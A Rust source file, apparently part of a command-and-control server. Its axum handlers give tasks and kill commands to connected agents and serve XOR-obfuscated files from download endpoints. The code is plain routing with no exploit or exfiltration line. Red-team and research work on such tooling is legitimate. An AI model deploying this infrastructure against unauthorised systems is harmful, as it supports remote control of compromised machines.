use std::sync::Arc;

use crate::{
    agents::handle_kill_command,
    app_state::AppState,
    net::{serialise_tasks_for_agent, serve_file},
};
use axum::{
    extract::{Path, Request, State},
    http::StatusCode,
    response::{IntoResponse, Response},
};

/// Handles the inbound connection, after authentication has validated the agent.
///
/// This is very much the 'end destination' for the inbound connection.
#[axum::debug_handler]
pub async fn handle_agent_get(state: State<Arc<AppState>>, request: Request) -> Vec<u8> {
    // Get the agent by its header, and fetch tasks from the db
    let (agent, tasks) = state
        .connected_agents
        .get_agent_and_tasks_by_header(request.headers(), &state.clone().db_pool, None)
        .await;

    // Check whether the kill command is present and the agent needs removing from the live list..
    handle_kill_command(state.connected_agents.clone(), &agent, &tasks).await;

    serialise_tasks_for_agent(tasks).await
}

/// Handles the inbound connection when the URI contains a path. The function will check to see if the path
/// is present in either the active C2 listener endpoints, or whether it is used to serve content.
#[axum::debug_handler]
pub async fn handle_agent_get_with_path(
    state: State<Arc<AppState>>,
    Path(endpoint): Path<String>,
    request: Request,
) -> Response {
    let state_arc = Arc::clone(&state);

    //
    // First check whether the URI is in the valid GET endpoints for the agent
    //
    let lock = state_arc.endpoints.read().await;

    if lock.c2_endpoints.contains(&endpoint) {
        // There is no need to authenticate here, that is done subsequently during
        // `handle_agent_get` where we pull the agent_id from the header
        drop(lock);
        return handle_agent_get(state, request).await.into_response();
    }

    //
    // Now we check whether it was a request to the download URI, if it is, we can serve that content
    // over to them.
    //
    if let Some(metadata) = lock.download_endpoints.get(&endpoint) {
        state
            .db_pool
            .update_download_count(&endpoint)
            .await
            .expect("could not update download count.");
        let filename = &metadata.file_name;
        return serve_file(filename, metadata.xor_key).await.into_response();
    }

    StatusCode::BAD_GATEWAY.into_response()
}
